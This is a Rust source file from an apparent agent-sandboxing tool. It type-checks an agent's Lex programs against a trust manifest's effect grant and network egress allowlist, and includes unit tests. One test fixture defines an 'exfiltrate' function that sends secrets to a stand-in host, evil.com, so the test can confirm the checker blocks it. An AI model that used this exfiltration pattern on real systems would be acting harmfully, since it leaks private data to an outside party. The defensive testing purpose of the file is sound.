//! The static grant↔effect wall — demo Attempt 1, "blocked at
//! type-check, before execution" (design doc §2, §7).
//!
//! The agent acts only through Lex commands, and every command's effect
//! signature *is* its trust requirement. This crate runs the agent's
//! `.lex` source through the real Lex front-end —
//! [`lex_syntax::parse_source`] → [`lex_ast::canonicalize_program`] →
//! [`lex_types::check_program`] — and then checks the program's declared
//! effects against the manifest's [`Grant`]:
//!
//! - **Coarse dimension check** (the wall): a program that uses `[net]`
//!   under a `network: none` grant, `[proc]` under `exec: none`, or
//!   `[fs_write]` under a read-only grant **does not type-check** — it is
//!   rejected here, before it runs, with a structured reason.
//! - **Precise host check** (bonus): if a program declares a host-scoped
//!   `net("host")` effect, that host must be in the manifest's egress
//!   allowlist (unless network is `full`).
//!
//! Note on layering: `std.net`'s `get`/`post` carry a *bare* `[net]`
//! effect (they don't bind a host at the type level), so per-host
//! egress for ordinary network code is enforced at the **perimeter**
//! (the kernel firewall, issue #3), not here. The type-check answers
//! "may this box touch the network at all?"; the perimeter answers
//! "which host?". Two layers, one grant.

use lex_os_manifest::{Grant, Level, Manifest, TrustError};
use lex_types::types::{EffectArg, EffectKind};
use lex_types::EffectSet;

/// What the check found about a program's network/effect surface.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CheckReport {
    /// Distinct effect kinds the program declares (e.g. `fs_read`,
    /// `net`), sorted.
    pub effects: Vec<String>,
    /// Host-scoped network targets the program reaches (`net("host")`),
    /// if any are declared. Bare `[net]` code contributes nothing here
    /// (its host is enforced at the perimeter).
    pub net_hosts: Vec<String>,
}

/// Why a program failed the wall.
#[derive(Debug, thiserror::Error)]
pub enum CheckError {
    #[error("parse error: {0}")]
    Parse(String),
    /// An import could not be resolved: a sibling module that is not on
    /// disk, or a package that has not been installed. Distinguished from
    /// [`CheckError::TypeCheck`] because the two call for completely
    /// different fixes, and surfacing an unresolved import as a list of
    /// `UnknownIdentifier`s reads as "your program is broken" when the
    /// program is fine and the environment is not (#117).
    #[error("could not load program: {0}")]
    Load(String),
    /// The program's body does not honour its declared effect rows (a
    /// dishonest signature) — caught by the Lex type checker, the same
    /// way `lex check` would reject it.
    #[error("type error: {0}")]
    TypeCheck(String),
    /// The program type-checks but its effects exceed what the manifest
    /// grant + egress allowlist permit. This is Attempt 1's refusal.
    #[error("grant violation: {0}")]
    GrantViolation(#[from] TrustError),
}

/// Parse, canonicalize, and type-check `src`, then verify its effects
/// are within `manifest`'s grant and egress allowlist.
pub fn check_source_against_manifest(
    src: &str,
    manifest: &Manifest,
) -> Result<CheckReport, CheckError> {
    check_source_against_grant(src, &manifest.grant, &manifest.egress)
}

/// The same, for a program on disk, **with its imports resolved** — the
/// entry point anything user-facing should use (#117).
pub fn check_path_against_manifest(
    entry: &std::path::Path,
    manifest: &Manifest,
) -> Result<CheckReport, CheckError> {
    check_effects_against_grant(effects_of_path(entry)?, &manifest.grant, &manifest.egress)
}

/// Lower-level entry: check against an explicit grant + egress allowlist.
pub fn check_source_against_grant(
    src: &str,
    grant: &Grant,
    egress: &[String],
) -> Result<CheckReport, CheckError> {
    // 1-4. Parse, canonicalize, type-check, collect declared effects.
    check_effects_against_grant(effects_of_source(src)?, grant, egress)
}

/// Step 5 alone, over an [`EffectSet`] a caller already has.
///
/// Extracted so a file (imports resolved) and a string (one file) reach
/// exactly the same wall. The comparison must not depend on how the
/// program was loaded.
fn check_effects_against_grant(
    effects: EffectSet,
    grant: &Grant,
    egress: &[String],
) -> Result<CheckReport, CheckError> {
    // 5a. Coarse wall: every effect must fit the grant's dimensions and
    //     levels (bare `[net]` needs network ≥ allowlist, `[proc]` needs
    //     exec, `[fs_write]` needs read-write, …).
    grant.permits_effects(&effects)?;

    // 5b. Precise host check for any host-scoped net effects that *are*
    //     declared (a hand-written command targeting a literal host).
    if grant.network != Level::Full {
        for e in &effects.concrete {
            if lex_types::trust::is_net_effect(&e.name) {
                if let Some(EffectArg::Str(host)) = &e.arg {
                    let covered = egress
                        .iter()
                        .any(|allow| lex_types::trust::host_matches(allow, host));
                    if !covered {
                        return Err(CheckError::GrantViolation(TrustError::NetHostNotAllowed {
                            host: host.clone(),
                            allowed: egress.len(),
                        }));
                    }
                }
            }
        }
    }

    Ok(report(&effects))
}

/// Run `src` through the real Lex front-end and return the typed
/// [`EffectSet`] its functions declare.
///
/// This is steps 1-4 of [`check_source_against_grant`] without the
/// grant comparison: parse, canonicalize, type-check (so a dishonest
/// effect row is rejected here, not carried forward), then collect.
/// Split out because the effect set is the input to *both* enforcement
/// questions — "does this fit the grant we were given?" (this crate)
/// and "what is the least grant that would fit it?"
/// (`lex-os-authority`) — and both must read the same effects from the
/// same front-end, or the wall and the derivation could disagree.
pub fn effects_of_source(src: &str) -> Result<EffectSet, CheckError> {
    // 1. Parse.
    let program = lex_syntax::parse_source(src).map_err(|e| CheckError::Parse(format!("{e:?}")))?;
    effects_of_program(&program)
}

/// The same, for a program on disk — **with its imports resolved**.
///
/// Prefer this over [`effects_of_source`] for anything a user names on
/// the command line. `parse_source` reads one file and knows nothing
/// about `./sibling` modules or installed packages, so every real Lex
/// package failed the wall before analysis even began, with a list of
/// `UnknownIdentifier`s that read as if the program were broken (#117).
/// `lex_syntax::load_program` resolves imports the way `lex check` does
/// — relative to the entry file, honouring the package cache — so the
/// effects collected here are the whole program's, not one file's.
///
/// That matters beyond ergonomics: effects are what the grant is derived
/// from and checked against. A `[net]` call in an imported module is
/// still a `[net]` call the box will make, and a single-file view of a
/// multi-file package cannot see it. Deriving an authority from the
/// entry file alone would understate the program.
pub fn effects_of_path(entry: &std::path::Path) -> Result<EffectSet, CheckError> {
    let program = lex_syntax::load_program(entry).map_err(|e| CheckError::Load(format!("{e}")))?;
    effects_of_program(&program)
}

/// Steps 2-4, shared by both entry points so a file and a string are
/// analysed identically once loaded.
fn effects_of_program(program: &lex_syntax::Program) -> Result<EffectSet, CheckError> {
    // 2. Canonicalize to typed-AST stages.
    let stages = lex_ast::canonicalize_program(program);

    // 3. Type-check — rejects dishonest effect rows (a `[io]` signature
    //    hiding a `[net]` call), exactly as the toolchain would.
    lex_types::check_program(&stages)
        .map_err(|errs| CheckError::TypeCheck(format!("{} error(s): {:?}", errs.len(), errs)))?;

    // 4. Collect the program's declared effects.
    Ok(collect_effects(&stages))
}

/// Build a typed [`EffectSet`] from the declared effects of every
/// function in the canonicalized program.
fn collect_effects(stages: &[lex_ast::Stage]) -> EffectSet {
    let mut set = EffectSet::empty();
    for stage in stages {
        if let lex_ast::Stage::FnDecl(fd) = stage {
            for e in &fd.effects {
                let kind = match &e.arg {
                    Some(lex_ast::EffectArg::Str { value }) => {
                        EffectKind::with_str(e.name.clone(), value.clone())
                    }
                    _ => EffectKind::bare(e.name.clone()),
                };
                set.concrete.insert(kind);
            }
        }
    }
    set
}

/// Summarise an [`EffectSet`] into the effect-kind / net-host view
/// a caller reports to a human.
pub fn report(effects: &EffectSet) -> CheckReport {
    let mut kinds: Vec<String> = effects.concrete.iter().map(|e| e.name.clone()).collect();
    kinds.sort();
    kinds.dedup();
    let mut net_hosts: Vec<String> = effects
        .concrete
        .iter()
        .filter(|e| lex_types::trust::is_net_effect(&e.name))
        .filter_map(|e| match &e.arg {
            Some(EffectArg::Str(h)) => Some(h.clone()),
            _ => None,
        })
        .collect();
    net_hosts.sort();
    net_hosts.dedup();
    CheckReport {
        effects: kinds,
        net_hosts,
    }
}

#[cfg(test)]
mod tests {

    /// A throwaway package directory, mirroring the tmp-dir idiom used in
    /// `lex-os/tests/capsule_audit.rs`.
    fn pkg_dir(tag: &str) -> std::path::PathBuf {
        let d =
            std::env::temp_dir().join(format!("lexos-check-imports-{}-{tag}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).expect("mkdir");
        d
    }

    /// #117: a program that imports a sibling module must analyse, and the
    /// effects must include the ones the SIBLING declares.
    ///
    /// The entry file below has no effects of its own — `[net]` is declared
    /// only in `wire.lex`. A single-file view sees a pure program and would
    /// derive an empty grant for something that dials the network, so this
    /// pins the whole-program view rather than merely "it no longer errors".
    #[test]
    fn imported_modules_contribute_their_effects() {
        let dir = pkg_dir("siblings");
        std::fs::write(
            dir.join("wire.lex"),
            "import \"std.net\" as net\n\
             fn fetch(u :: Str) -> [net] Result[Str, Str] { net.get(u) }\n",
        )
        .unwrap();
        std::fs::write(
            dir.join("main.lex"),
            "import \"./wire\" as wire\n\
             fn go(u :: Str) -> [net] Result[Str, Str] { wire.fetch(u) }\n",
        )
        .unwrap();

        let effects = effects_of_path(&dir.join("main.lex"))
            .expect("a package with a sibling import must analyse");
        let names: Vec<&str> = effects.concrete.iter().map(|e| e.name.as_str()).collect();
        assert!(
            names.contains(&"net"),
            "the sibling's [net] must reach the effect set, got {names:?}"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The same program read as a STRING cannot see the sibling at all.
    ///
    /// This is the behaviour that made `derive` and `check` unusable on every
    /// real package, and it is why the path entry point exists. Pinned so the
    /// two are not quietly collapsed back into one.
    #[test]
    fn reading_one_file_as_a_string_cannot_resolve_a_sibling() {
        let src = "import \"./wire\" as wire\n\
                   fn go(u :: Str) -> [net] Result[Str, Str] { wire.fetch(u) }\n";
        assert!(
            effects_of_source(src).is_err(),
            "a string source has no base path and must not silently succeed"
        );
    }

    /// An unresolvable import is reported as a LOAD failure, not as a pile of
    /// `UnknownIdentifier` type errors. The distinction matters because the
    /// fixes differ completely — install the package versus fix the code —
    /// and the old message accused the program of being broken when it was
    /// the environment that was incomplete.
    #[test]
    fn a_missing_import_is_a_load_error_not_a_type_error() {
        let dir = pkg_dir("missing");
        std::fs::write(
            dir.join("main.lex"),
            "import \"./nope\" as n\nfn go() -> Int { n.x() }\n",
        )
        .unwrap();

        match effects_of_path(&dir.join("main.lex")) {
            Err(CheckError::Load(msg)) => {
                assert!(
                    msg.contains("nope"),
                    "the message must name the import that failed, got: {msg}"
                );
            }
            other => panic!("expected a Load error, got {other:?}"),
        }

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A single-file program with no imports still works by path — the fix
    /// must not regress the case that already worked.
    #[test]
    fn a_stdlib_only_program_still_analyses_by_path() {
        let dir = pkg_dir("nodeps");
        std::fs::write(
            dir.join("main.lex"),
            "import \"std.net\" as net\n\
             fn go(u :: Str) -> [net] Result[Str, Str] { net.get(u) }\n",
        )
        .unwrap();

        let effects = effects_of_path(&dir.join("main.lex")).expect("stdlib-only must analyse");
        let names: Vec<&str> = effects.concrete.iter().map(|e| e.name.as_str()).collect();
        assert!(names.contains(&"net"), "got {names:?}");

        let _ = std::fs::remove_dir_all(&dir);
    }
    use super::*;
    use lex_os_manifest::{Budget, Goal};

    // Honest network code: `net.get` carries a bare `[net]` effect, so
    // the signature declares `[net]`.
    const NET_PROGRAM: &str = r#"
import "std.net" as net
fn submit(body :: Str) -> [net] Result[Str, Str] {
  net.get("https://results.demo.internal/submit")
}
"#;

    const PURE: &str = r#"
fn add(a :: Int, b :: Int) -> Int { a + b }
"#;

    // Dishonest: declares `[io]` but the body performs `[net]`.
    const DISHONEST: &str = r#"
import "std.net" as net
fn sneaky(u :: Str) -> [io] Result[Str, Str] {
  net.get(u)
}
"#;

    fn manifest(grant: Grant) -> Manifest {
        Manifest::new(Goal::new("t"), grant, Budget::research_default())
    }

    #[test]
    fn net_program_blocked_under_network_none() {
        // The wall: a program that touches the network does not
        // type-check under `network: none`.
        let m = manifest(Grant::new(Level::Full, Level::None, Level::Full));
        match check_source_against_manifest(NET_PROGRAM, &m).unwrap_err() {
            CheckError::GrantViolation(TrustError::EffectNotPermitted {
                dimension: lex_os_manifest::Dimension::Network,
                ..
            }) => {}
            other => panic!("expected Network EffectNotPermitted, got {other:?}"),
        }
    }

    #[test]
    fn net_program_allowed_when_network_granted() {
        // Demo grant: net is granted (allowlist level); the perimeter
        // scopes the host. The program type-checks.
        let m = manifest(Grant::new(Level::Full, Level::Allowlist, Level::Full))
            .with_egress(vec!["results.demo.internal".into()]);
        let report = check_source_against_manifest(NET_PROGRAM, &m).unwrap();
        assert!(report.effects.contains(&"net".to_string()));
    }

    #[test]
    fn pure_program_passes_bottom_grant() {
        let report = check_source_against_grant(PURE, &Grant::bottom(), &[]).unwrap();
        assert!(report.effects.is_empty());
    }

    #[test]
    fn dishonest_effect_row_is_a_type_error() {
        // Rejected before the grant check even runs.
        let m = manifest(Grant::top());
        assert!(matches!(
            check_source_against_manifest(DISHONEST, &m).unwrap_err(),
            CheckError::TypeCheck(_)
        ));
    }

    #[test]
    fn parse_error_is_reported() {
        let err = check_source_against_grant("fn (", &Grant::top(), &[]).unwrap_err();
        assert!(matches!(err, CheckError::Parse(_)));
    }

    // A program that declares the target host literally in its effect row
    // (the parameterized form `[net("evil.com")]`). The wall must reject
    // it before run, even when network is broadly granted, so long as the
    // egress allowlist doesn't cover the host.
    const HOST_SCOPED_EVIL: &str = r#"
import "std.net" as net
fn exfiltrate(secrets :: Str) -> [net, net("evil.com")] Result[Str, Str] {
  net.get("https://evil.com/collect")
}
"#;

    #[test]
    fn host_scoped_program_rejected_when_host_not_in_allowlist() {
        // The demo grant: Allowlist net + egress=[results.demo.internal:443].
        // Mirrors demo/manifest.json and the live attack at
        // demo/attacks/01_typecheck_evil_host.lex (issues #4, #10).
        let m = manifest(Grant::new(Level::Full, Level::Allowlist, Level::Full))
            .with_egress(vec!["results.demo.internal:443".into()]);
        let err = check_source_against_manifest(HOST_SCOPED_EVIL, &m).unwrap_err();
        match err {
            CheckError::GrantViolation(TrustError::NetHostNotAllowed { host, .. }) => {
                assert_eq!(host, "evil.com");
            }
            other => panic!("expected NetHostNotAllowed for evil.com, got {other:?}"),
        }
    }

    #[test]
    fn host_scoped_program_passes_when_host_in_allowlist() {
        // Same program shape but the literal host matches the allowlist.
        let src = r#"
import "std.net" as net
fn submit(report :: Str) -> [net, net("results.demo.internal")] Result[Str, Str] {
  net.get("https://results.demo.internal/submit")
}
"#;
        let m = manifest(Grant::new(Level::Full, Level::Allowlist, Level::Full))
            .with_egress(vec!["results.demo.internal:443".into()]);
        let report = check_source_against_manifest(src, &m).unwrap();
        assert!(report
            .net_hosts
            .contains(&"results.demo.internal".to_string()));
    }

    #[test]
    fn host_scoped_effect_checked_against_allowlist() {
        // A synthetic host-scoped net effect (as a hand-written command
        // primitive might declare) is matched against the allowlist.
        let grant = Grant::new(Level::None, Level::Allowlist, Level::None);
        let mut allowed = EffectSet::empty();
        allowed
            .concrete
            .insert(EffectKind::with_str("net", "results.demo.internal"));
        // Reuse the lex-types primitive directly for the synthetic case.
        assert!(grant
            .permits_effects_with_allowlist(&allowed, &["results.demo.internal".to_string()])
            .is_ok());
        let mut evil = EffectSet::empty();
        evil.concrete
            .insert(EffectKind::with_str("net", "evil.com"));
        assert!(grant
            .permits_effects_with_allowlist(&evil, &["results.demo.internal".to_string()])
            .is_err());
    }
}
